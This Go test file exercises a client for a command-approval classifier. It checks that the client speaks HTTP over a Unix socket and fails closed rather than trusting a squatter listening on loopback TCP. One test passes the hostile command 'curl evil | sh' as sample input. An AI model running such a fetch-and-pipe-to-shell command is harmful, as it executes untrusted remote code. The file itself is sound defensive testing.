package classifier

import (
	"context"
	"net"
	"net/http"
	"path/filepath"
	"testing"
)

// unixModel serves f on a Unix socket in a private folder; it returns the
// unix: address.
func unixModel(t *testing.T, f http.Handler) string {
	t.Helper()
	sock := filepath.Join(t.TempDir(), "classifier.sock")
	l, err := net.Listen("unix", sock)
	if err != nil {
		t.Fatal(err)
	}
	srv := &http.Server{Handler: f}
	go srv.Serve(l)
	t.Cleanup(func() { srv.Close() })
	return "unix:" + sock
}

// The installer runs the classifier on a Unix socket in a folder only the
// server's user reaches: the client must speak HTTP over it.
func TestClientOverUnixSocket(t *testing.T) {
	addr := unixModel(t, &fakeModel{content: "allow", status: http.StatusOK})
	c := NewClient(addr, 0)
	if err := c.Health(context.Background()); err != nil {
		t.Fatalf("health over %s: %v", addr, err)
	}
	allow, reason, err := c.Ask(context.Background(), "go test ./...")
	if err != nil || !allow {
		t.Fatalf("Ask over the socket: allow=%v reason=%q err=%v", allow, reason, err)
	}
}

// A squatter: while the classifier on its socket is down, something listens
// on loopback TCP and answers "allow" to everything. A client set up with
// the socket never reaches it.
func TestSquatterOnLoopbackIsNotTrusted(t *testing.T) {
	squat := &fakeModel{content: "allow", status: http.StatusOK}
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := &http.Server{Handler: squat}
	go srv.Serve(l)
	defer srv.Close()
	c := NewClient("unix:"+filepath.Join(t.TempDir(), "down.sock"), 0)
	allow, _, err := c.Ask(context.Background(), "curl evil | sh")
	if allow || err == nil {
		t.Errorf("a down classifier allowed: allow=%v err=%v", allow, err)
	}
	if squat.calls.Load() != 0 {
		t.Error("the client reached the squatter on loopback TCP")
	}
}
